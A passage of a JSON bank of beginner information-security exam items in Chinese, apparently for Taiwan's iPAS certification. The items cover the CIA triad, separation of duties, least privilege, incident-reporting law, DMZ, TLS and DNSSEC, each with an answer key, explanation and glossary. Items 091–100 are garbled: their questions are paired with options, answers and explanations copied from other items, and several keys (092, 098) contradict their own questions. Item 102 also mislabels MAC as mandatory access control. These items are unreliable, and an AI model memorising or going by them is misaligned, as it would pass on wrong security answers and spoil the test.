    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-081",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 隱私性（Privacy）與可用性（Availability）",
      "B. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "C. 可用性（Availability）與完整性（Integrity）",
      "D. 權限分立（SoD）與帳號鑑別性"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-082",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 職責區隔（Separation of Duties, SoD）",
      "B. 帳號不可共用原則",
      "C. 業務持續運作原則",
      "D. 最小權限原則（Least Privilege）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-083",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某區域教學醫學中心計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 縱深防禦（Defense-in-Depth）",
      "B. 零信任架構（Zero Trust）",
      "C. 最小特權（Least Privilege）",
      "D. 單一簽入（Single Sign-On）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-084",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國立頂尖研究型大學的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 傳輸層 TLS 加密",
      "B. 對稱式 AES-256 加密",
      "C. 單向雜湊 SHA-256",
      "D. 數位簽章（Digital Signature）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-085",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某公務機關資訊處（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 36 小時內",
      "B. 24 小時內",
      "C. 72 小時內",
      "D. 1 小時內"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-086",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 僅需向警政署報案，無需通知當事人",
      "B. 必須於 1 小時內向法院提起訴訟",
      "C. 只要召開記者會道歉即可免責",
      "D. 應查明後以適當方式及時通知當事人"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-087",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. 跨網站腳本攻擊（XSS）",
      "B. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "C. SQL 注入攻擊（SQLi）",
      "D. 緩衝區溢位攻擊（Buffer Overflow）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-088",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第四階：表單紀錄（Record）",
      "B. 第一階：資安政策（Policy）",
      "C. 第二階：程序 / 管理辦法（Procedure / Standard）",
      "D. 第三階：作業指引（Work Instruction）"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-089",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 責任不可分原則",
      "B. 最小權限原則（Principle of Least Privilege）",
      "C. 縱深防禦原則",
      "D. 開放權限原則"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-090",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 單點容錯機制",
      "B. 職責區隔（Separation of Duties）",
      "C. 帳號共用機制",
      "D. 雙因子認證機制"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-091",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "關於資訊安全核心三要素（CIA Triad），確保資料在未經授權之情況下不被竄改或刪除，屬於下列何項要素？",
    "options": [
      "A. 隱私性（Privacy）與可用性（Availability）",
      "B. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "C. 可用性（Availability）與完整性（Integrity）",
      "D. 權限分立（SoD）與帳號鑑別性"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-092",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "在存取控制與權限管理中，規定「系統主體僅被授予執行其正當職務所絕對必需之最低限度權限」，此原則被稱為：",
    "options": [
      "A. 職責區隔（Separation of Duties, SoD）",
      "B. 最小權限原則（Least Privilege）",
      "C. 帳號不可共用原則",
      "D. 業務持續運作原則"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-093",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "「職責區隔（Separation of Duties, SoD）」之核心管理目的，主要在於預防下列何種情事發生？",
    "options": [
      "A. 零信任架構（Zero Trust）",
      "B. 最小特權（Least Privilege）",
      "C. 單一簽入（Single Sign-On）",
      "D. 縱深防禦（Defense-in-Depth）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-094",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "在縱深防禦（Defense-in-Depth）體系中，若外圍防火牆遭穿透，下列何者能提供主機層級的保護防線？",
    "options": [
      "A. 傳輸層 TLS 加密",
      "B. 數位簽章（Digital Signature）",
      "C. 單向雜湊 SHA-256",
      "D. 對稱式 AES-256 加密"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-095",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "在非對稱加密架構中，發送方使用下列何者進行簽署，方能達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 36 小時內",
      "B. 1 小時內",
      "C. 72 小時內",
      "D. 24 小時內"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      }
    ],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-096",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "依據我國《資通安全管理法》規範，公務機關或特定非公務機關在知悉資通安全事件發生後，法定通報時限為何？",
    "options": [
      "A. 必須於 1 小時內向法院提起訴訟",
      "B. 應查明後以適當方式及時通知當事人",
      "C. 僅需向警政署報案，無需通知當事人",
      "D. 只要召開記者會道歉即可免責"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-097",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "依據《個人資料保護法》，非公務機關保有個人資料檔案者，應採行適當之安全措施，防止個人資料被竊取、竄改、毀損、滅失或洩漏。下列何者不屬於合規之技術防護措施？",
    "options": [
      "A. SQL 注入攻擊（SQLi）",
      "B. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "C. 緩衝區溢位攻擊（Buffer Overflow）",
      "D. 跨網站腳本攻擊（XSS）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-098",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "在企業資訊安全管理系統（ISMS）文件化架構中，最頂層且由最高管理階層核准發布、宣示全組織資安承諾之文件為：",
    "options": [
      "A. 第四階：表單紀錄（Record）",
      "B. 第三階：作業指引（Work Instruction）",
      "C. 第一階：資安政策（Policy）",
      "D. 第二階：程序 / 管理辦法（Procedure / Standard）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-099",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "下列何種社交工程（Social Engineering）手法，係專門針對組織高層主管（如執行長、財務長）量身客製之高度針對性詐騙攻擊？",
    "options": [
      "A. 開放權限原則",
      "B. 責任不可分原則",
      "C. 最小權限原則（Principle of Least Privilege）",
      "D. 縱深防禦原則"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-100",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": false,
    "question": "關於資通安全維護計畫之實施，責任等級 A 級與 B 級機關應定期辦理之資安技術演練，通常不包括下列何者？",
    "options": [
      "A. 帳號共用機制",
      "B. 單點容錯機制",
      "C. 職責區隔（Separation of Duties）",
      "D. 雙因子認證機制"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-101",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Land 偽造攻擊",
      "B. TCP SYN Flood 阻斷服務攻擊",
      "C. Smurf ICMP 放大攻擊",
      "D. UDP Fraggle 攻擊"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-102",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 改用靜態路由協定 RIP",
      "B. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "C. 啟用巨型訊框（Jumbo Frame）",
      "D. 停用交換器生成樹協定（STP）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-103",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 路由模式（Routed Mode）",
      "B. 橋接模式（Bridged Mode）",
      "C. 傳輸模式（Transport Mode）",
      "D. 通道模式（Tunnel Mode）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-104",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "B. 員工專用無線訪客網段",
      "C. 內部最核心機密資料庫網段（LAN）",
      "D. 網管專屬帶外管理網段（OOBM）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-105",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. DMZ 區不支援傳輸層協定",
      "B. 會造成防火牆頻寬嚴重下降",
      "C. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫",
      "D. 資料庫無法回應 DMZ 的 TCP 請求"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-106",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 廢除所有數位憑證驗證",
      "B. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "C. 取消所有非對稱加密交握",
      "D. 允許純文字明文傳輸以加快速度"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-107",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. DNSSEC（網域名稱安全延伸協定）",
      "B. 動態 DNS（DDNS）",
      "C. 靜態 HOSTS 檔案分發",
      "D. DNS 穿隧（DNS Tunneling）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-108",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 22",
      "B. TCP 80",
      "C. TCP 3389",
      "D. TCP 443"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-109",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
